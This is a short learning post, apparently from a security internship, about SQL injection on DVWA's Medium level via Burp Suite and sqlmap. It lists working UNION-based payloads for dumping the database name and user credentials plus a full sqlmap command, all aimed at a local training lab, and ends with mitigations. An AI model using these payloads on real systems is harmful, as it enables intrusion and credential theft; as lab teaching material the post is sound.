@@ -1,0 +1,23 @@
+Learning in public: SQL Injection at DVWA Medium — Task 9
+
+Continuing my OASIS INFOBYTE Cyber Security track, I moved from Low to Medium security on DVWA.
+
+At Medium, the classic text input disappears and becomes a dropdown. That’s the first lesson: frontend restrictions don’t equal backend safety.
+
+With Burp Suite intercepting the request, I was able to modify the `id` parameter after it left the browser:
+- id=1 OR 1=1 to dump the users table
+- id=1 UNION SELECT null, database() -- - to confirm the DB name
+- id=1 UNION SELECT null, username, password FROM users -- - for credential extraction
+
+The bigger learning was with sqlmap. Even with DVWA set to Medium in the browser, sqlmap kept hitting Low. It turns out sqlmap is a separate client — without the session cookie it gets the default security level.
+
+Fix was simple but important: pass the session explicitly
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=...; security=medium" \
+  --level=3 --risk=2 --batch --dbs
+
+Still a lot to learn about proper mitigation — parameterized queries, strict input validation on the backend even when the UI is a dropdown, least-privilege DB users, and WAFs.
+
+Repo with notes and script: OIBSIP/CyberSecurity-Task9-SQLInjectionAdvanced
+
+#CyberSecurity #EthicalHacking #DVWA #SQLInjection #BurpSuite #sqlmap #LearningInPublic #OASISINFOBYTE
